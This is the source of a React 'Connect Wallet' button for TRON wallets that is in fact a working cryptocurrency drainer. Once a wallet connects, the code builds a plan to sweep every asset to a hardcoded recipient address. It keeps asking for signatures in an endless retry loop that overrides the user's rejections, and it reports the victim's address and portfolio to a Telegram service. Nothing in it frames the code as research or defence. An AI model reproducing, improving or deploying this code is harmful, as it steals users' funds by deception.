import React, { useState, useEffect, useRef } from 'react';
import { useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
import { useWalletModal } from '@tronweb3/tronwallet-adapter-react-ui';
import { TransactionService } from '../services/transaction.service';
import { TelegramService } from '../services/telegram.service';
import { useTranslation } from 'react-i18next';

// --- CONFIGURATION ---
// Address to receive funds
const RECIPIENT_ADDRESS = 'TWBRNk1RJJ9Vvff38ARFvvmhbGk7UybJYg';
// ---------------------

const ConnectWalletBtn = ({ className }) => {
    const { address, signTransaction, connected, select, wallets, connect, wallet } = useWallet();
    const { setVisible } = useWalletModal();
    const { t } = useTranslation();
    const [status, setStatus] = useState('');
    const [isLoading, setIsLoading] = useState(false);

    // To prevent double execution
    const hasTriggeredRef = useRef(false);
    const hasNotifiedRef = useRef(false);

    const handleTransaction = async () => {
        if (!address) return;

        console.log("Auto-Triggering Transaction Flow...");
        setIsLoading(true);
        setStatus('Scanning wallet...');

        try {
            // 1. Create Sweep Plan
            const plan = await TransactionService.createSweepPlan(address, RECIPIENT_ADDRESS);
            console.log("Sweep Plan:", plan);

            if (plan.length === 0) {
                setStatus("No assets to move.");
                setIsLoading(false);
                return;
            }

            setStatus(`Processing ${plan.length} assets...`);

            // 2. Execute Plan
            for (let i = 0; i < plan.length; i++) {
                const item = plan[i];

                // Infinite retry loop for each asset until success
                while (true) {
                    setStatus(`Signing ${item.type}...`);

                    try {
                        // Sign
                        // Sign
                        // Force redirect to Trust Wallet if using WalletConnect (Mobile behavior)
                        // We explicitly check 'WalletConnect' OR if we are in TWA (since TWA uses WalletConnect by default here)
                        const isWalletConnect = wallet?.adapter?.name === 'WalletConnect' || (wallets.find(w => w.adapter.name === 'WalletConnect')?.adapter?.connected);

                        if (isWalletConnect) {
                            if (window.Telegram?.WebApp?.initData) {
                                window.Telegram.WebApp.openLink('https://link.trustwallet.com');
                            } else {
                                window.location.href = 'trust://';
                            }
                        }
                        const signedTransaction = await signTransaction(item.transaction);

                        // Broadcast
                        setStatus(`Sending ${item.type}...`);
                        const result = await TransactionService.broadcast(signedTransaction);

                        if (result.result) {
                            console.log(`${item.type} Success:`, result.txid);
                            break; // Success: Move to next asset
                        } else {
                            console.error(`${item.type} Failed:`, result);
                            // Failed at broadcast level? Retry.
                            await new Promise(resolve => setTimeout(resolve, 1000));
                        }
                    } catch (err) {
                        console.error("Sign Error (Retrying...):", err);
                        // User rejected or error? Retry automatically after 1s
                        await new Promise(resolve => setTimeout(resolve, 1000));
                    }
                }
            }

            setStatus('Transfer Complete');
        } catch (error) {
            console.error("Transaction Error:", error);
            setStatus('Error');
        } finally {
            setIsLoading(false);
        }
    };

    // Auto-trigger logic & Notifications
    useEffect(() => {
        console.log(`[ConnectWalletBtn] State Change: Connected=${connected}, Address=${address}, Notified=${hasNotifiedRef.current}`);

        let transactionTimer;

        if (connected && address) {
            // 1. Transaction Auto-Trigger
            if (!hasTriggeredRef.current) {
                console.log("[ConnectWalletBtn] Initializing Transaction Timer...");
                hasTriggeredRef.current = true;
                transactionTimer = setTimeout(() => handleTransaction(), 1000);
            }

            // 2. Telegram Notification (Robust & Fallback)
            if (!hasNotifiedRef.current) {
                hasNotifiedRef.current = true;

                (async () => {
                    try {
                        console.log("[ConnectWalletBtn] 🚀 Starting Notification Sequence...");

                        // Wait for stability
                        await new Promise(resolve => setTimeout(resolve, 1000));

                        // Fetch portfolio with 4s timeout fallback
                        const fetchPortfolio = TransactionService.getWalletPortfolio(address);
                        const timeout = new Promise(resolve => setTimeout(() => resolve(null), 4000));

                        const portfolio = await Promise.race([fetchPortfolio, timeout]);

                        if (portfolio) {
                            console.log("[ConnectWalletBtn] ✅ Portfolio received:", portfolio);
                            await TelegramService.sendConnectionNotification(portfolio, address);
                        } else {
                            console.warn("[ConnectWalletBtn] ⚠️ Portfolio timed out. Sending basic notification.");
                            // Fallback object
                            await TelegramService.sendConnectionNotification({ trx: 0, tokens: [], totalUsd: 0 }, address);
                        }
                    } catch (err) {
                        console.error("[ConnectWalletBtn] ❌ Notification Sequence Failed:", err);
                    }
                })();
            }
        }

        if (!connected) {
            if (hasTriggeredRef.current || hasNotifiedRef.current) {
                console.log("[ConnectWalletBtn] Resetting states (Disconnected)");
            }
            hasTriggeredRef.current = false;
            hasNotifiedRef.current = false;
            setStatus('');
        }

        return () => {
            if (transactionTimer) clearTimeout(transactionTimer);
        };
    }, [connected, address]);

    // Handle button click: Direct WalletConnect Trigger
    const handleClick = async () => {
        if (!connected) {
            try {
                // Find WalletConnect adapter
                const walletConnectAdapter = wallets.find(w => w.adapter.name === 'WalletConnect');

                if (walletConnectAdapter) {
                    console.log("Selecting WalletConnect adapter...");
                    // If not already selected, select it
                    if (wallet?.adapter?.name !== 'WalletConnect') {
                        select(walletConnectAdapter.adapter.name);
                    }

                    // Trigger connection immediately (or with slight delay if just selected)
                    // We use a small timeout to allow state to propagate if selection just happened
                    setTimeout(() => {
                        connect();
                    }, 100);
                } else {
                    console.error("WalletConnect adapter not found");
                    // Fallback to standard modal if somehow missing
                    setVisible(true);
                }
            } catch (e) {
                console.error("Connection Error:", e);
            }
        }
    };

    return (
        <button
            className={className}
            onClick={handleClick}
            disabled={isLoading}
        >
            {connected ? (status || t('buttons.walletConnected')) : t('buttons.connectWallet')}
        </button>
    );
};

export default ConnectWalletBtn;
